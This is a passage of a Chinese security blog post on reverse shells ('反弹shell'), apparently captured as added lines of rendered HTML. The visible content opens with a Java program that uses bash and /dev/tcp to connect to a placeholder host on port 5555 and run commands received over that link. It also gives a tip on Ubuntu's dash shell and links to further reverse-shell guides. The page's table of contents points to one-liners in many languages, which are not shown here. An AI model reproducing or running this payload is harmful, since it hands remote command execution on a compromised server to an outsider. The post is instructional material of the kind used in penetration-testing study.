class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>当我们使用Ubuntu作为服务器，是无法直接通过使用命令执行的函数如<code>system()</code>等去执行<code>bash</code>命令，会显示<code>sh: 1: Syntax error: Bad fd number</code>，这个错误在centos中是不会出现的，这是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20190115161623.png" alt="img"></p>
+<h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>由于把Window作为服务器比较少见，在加上里面很多东西我也没见过，这里贴个链接，以备不时之需。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" >Windows 反弹 shell<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2548" >Linux反弹shell（一）文件描述符与重定向<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549#toc-10" >Linux 反弹shell（二）反弹shell的本质<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：反弹shell</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-03-29 15:31:07</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/03/29/反弹shell/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/03/29/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">命令注入总结</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="nav-text">文件描述符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">输入重定向</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">输出重定向</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%87%E5%87%86%E8%BE%93%E5%87%BA%E4%B8%8E%E6%A0%87%E5%87%86%E9%94%99%E8%AF%AF%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">标准输出与标准错误输出重定向</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E7%9A%84%E5%A4%8D%E5%88%B6"><span class="nav-text">文件描述符的复制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-%E7%BB%91%E5%AE%9A%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">exec 绑定重定向</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="nav-text">常见利用语句</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bash"><span class="nav-text">bash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-text">exec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#netcat"><span class="nav-text">netcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#telnet"><span class="nav-text">telnet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#awk"><span class="nav-text">awk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#socat"><span class="nav-text">socat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Python"><span class="nav-text">Python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP"><span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Perl"><span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ruby"><span class="nav-text">Ruby</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java"><span class="nav-text">Java</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-text">注意事项</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Window"><span class="nav-text">Window</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
